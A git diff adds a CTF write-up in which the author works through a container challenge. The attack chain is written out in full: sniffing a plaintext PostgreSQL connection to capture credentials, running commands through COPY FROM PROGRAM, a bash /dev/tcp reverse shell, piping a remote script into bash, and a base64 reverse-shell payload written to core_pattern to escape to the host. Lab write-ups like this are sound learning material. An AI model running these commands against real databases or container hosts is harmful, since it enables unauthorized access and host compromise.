@@ -121,6 +121,229 @@ Bingo. The flag shows.
 It's a traditional SSRF technique. But it's using the IMDSv2. So we need a SSRF which access PUT method and also custom headers. Then we can get the credentials. The interesting part is data perimeters policy. We can use presigned URLs with the ssrf endpoint. 
 
 
+# Contain Me If You Can
+This one is difficult. 
+
+I tried to get some infomations about the system.
+`ls -la /`
+
+`cat /proc/mounts | xargs -d ',' -n 1 | grep workdir`
+```
+workdir=/var/lib/docker/overlay2/69bdc276831c13a1fe558b37e77167b3bff27487f7425ee46f82444e1ae070f2/work 0 0
+```
+Didn't get much info. So I asked for a hint.
+Hint 1
+```
+Can you spot any interesting established network connections?
+```
+Then I try to get some network information.
+
+```
+netstat
+Active Internet connections (w/o servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 b7f6fbdc0560:45578      postgres_db.:postgresql ESTABLISHED
+Active UNIX domain sockets (w/o servers)
+Proto RefCnt Flags       Type       State         I-Node   Path
+
+netstat -tunapl
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.11:42547        0.0.0.0:*               LISTEN      -                   
+tcp        0      0 172.19.0.3:45578        172.19.0.2:5432         ESTABLISHED -                   
+udp        0      0 127.0.0.11:49887        0.0.0.0:*                           -      
+
+```
+Well, I see a `postgres_db`.
+Then I try to connect to the db directly. I tried blank password and the default password and some simple password. And I can't login.
+Then I try to dump the traffic. I can see a `select` command. At first sight, I thought it's network tampering and network replay. Try to change the sql command with some evil command and resent. Then I try to find some existing tools. Seems it's a dead end. I also find that there are some ctfer who also tried this way and failed.
+```
+psql -h 172.19.0.2
+
+tcpdump -A -i any -s 0 host 172.19.0.2 and port 5432
+
+```
+So, we need more hint. Hint 2
+```
+This network connection is plain-text. Can you think of a way to take advantage of it?
+```
+No new idea. We tried to capture the traffic.
+More hint. Hint 3
+```
+`COPY ... FROM PROGRAM` can be used to execute arbitrary code in PostgreSQL.
+```
+So we can use this command to exec command. Question is how? Tamper the traffic?
+
+Try to get some  help with search engine.
+
+This [writeup](https://medium.com/@danielndias/challenge-2-contain-me-if-you-can-b0b47226c5eb) suggests that we can kill the connection. And when the connection reconnects, we can capture the credentials.
+```
+tcpkill -i any host 172.19.0.2 and port 5432
+tcpdump -A -i any -s 0  host 172.19.0.2 and port 5432 
+```
+From  the dump, we can see a string `SecretPostgreSQLPassword`. Then I try to login with it, but I still can't login.
+Then I give the dump to DeepSeek, it told me the username and databasename.
+
+Then we log in to the database.
+```
+
+psql -h 172.19.0.2 -U user 
+
+psql "host=172.19.0.2 port=5432 user=user dbname=mydatabase"
+```
+The psql shell is different from mysql shell. You need to use \ to start a command. So I asked DeepSeek to create some table and exec the copy command.
+
+```
+CREATE TABLE simple_table (
+    content TEXT
+);
+
+\copy simple_table from program 'ls /'
+
+select * from simple_table;
+
+
+\copy simple_table from program 'cat /flag'
+
+\copy simple_table from program 'id'
+```
+We didn't get the flag. We learned that we are still in a container later.
+
+Get more hint.Hint 4
+```
+The PostgreSQL administrator of this environment needed a really easy and convenient way to become root for maintenance purposes.
+```
+Then I try to get database config to get some root password. And this not the right direction.
+```
+
+SHOW config_file;
+               config_file                
+------------------------------------------
+ /var/lib/postgresql/data/postgresql.conf
+
+\copy simple_table from program 'cat /var/lib/postgresql/data/postgresql.conf'
+
+SHOW hba_file;
+               hba_file               
+--------------------------------------
+ /var/lib/postgresql/data/pg_hba.conf
+
+\copy simple_table from program 'cat /var/lib/postgresql/data/pg_hba.conf'
+```
+
+
+Get more hint from [writeup 2](https://tresscross.blog/contain-me-if-you-can-wiz-cloud-ctf-july/) and [writeup 3](https://manesec.github.io/2025/08/24/2025/61-WIZ-Contain-Me-If-You-Can/).
+
+We need to get a reverse shell with the pg command. Then we need to do a docker escape. In the end we get the flag.
+
+We need reverse shells and the writeup suggests we use `tmux`.
+```
+apt update
+apt install tmux
+
+tmux
+ctrl+b, %
+# ctrl+b, arrow key to switch 
+
+ctrl+b "
+
+# get ip
+ifconfig | grep 172
+172.19.0.3
+
+# start a listener
+nc -lvnp 7000
+
+
+CREATE TABLE shell(t TEXT);
+COPY shell FROM PROGRAM '/bin/bash -c "/bin/bash -i >& /dev/tcp/172.19.0.3/7000 0>&1"' ;
+```
+
+Now we get a reverse shell from the db.
+```
+032c93ff87db:~/data$ whoami
+whoami
+postgres
+032c93ff87db:~/data$ id
+id
+uid=70(postgres) gid=70(postgres) groups=10(wheel),70(postgres)
+032c93ff87db:~/data$ 
+```
+Writeup3 suggests we use `Linpeas` to check the container.
+```
+032c93ff87db:~/data$ sudo su
+sudo su
+whoami
+root
+
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+
+chmod +x linpeas.sh
+bash linpeas.sh
+
+./linpeas.sh > output.txt
+```
+It's not easy to see the results with current tmux settings. You need to change the setting to see more.
+So we just skip this part and go to the `/proc/sys/kernel/core_pattern` part.
+
+
+First we tried this payload, but can't get a shell
+```
+echo '|/bin/bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOS4wLjMvOTAwMCAwPiYx | base64 -d | /bin/bash"' > /proc/sys/kernel/core_pattern
+sh -c 'kill -11 "$$"'
+
+nc -lvnp 9000
+```
+
+Then we tried a payload from [wiz blog](https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r). It works.
+```
+echo '|/bin/bash -c echo${IFS%%??}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOS4wLjMvOTAwMCAwPiYx|base64${IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern 
+
+sh -c 'kill -11 "$$"' 
+```
+
+So what works here is that we try to write a command to the core_pattern. And then we sent to a crash command. When the system get the crash, it will exec the command we write in the core_pattern. Then we get a shell in the host machine.
+
+Some more [techniques](https://juggernaut-sec.com/docker-breakout-lpe/).
+
+
+```
+# check the system
+uname
+Linux
+cat /etc/issue
+Welcome to Alpine Linux 3.21
+Kernel \r on an \m (\l)
+
+# install some package
+sudo apk add curl
+sudo apk add python3
+
+# get a new tty
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+CTRL + Z         #backgrounds netcat session
+stty raw -echo
+fg               #brings netcat session back to the foreground
+export TERM=xterm
+
+
+#wget https://github.com/cdk-team/CDK/releases/download/v1.5.6/cdk_linux_amd64
+
+
+sudo -l
+sudo su
+
+cat /proc/mounts | grep 'proc'
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+
+ls -l /proc/sys/kernel/core_pattern
+
+```
+
+It's a really hard one if you don't have ctf experience.
+We learned that we can use `copy . from program` to exec command in pgsql and we can use `core_pattern` to privilege escalate to the host.
+
+
 
 
 
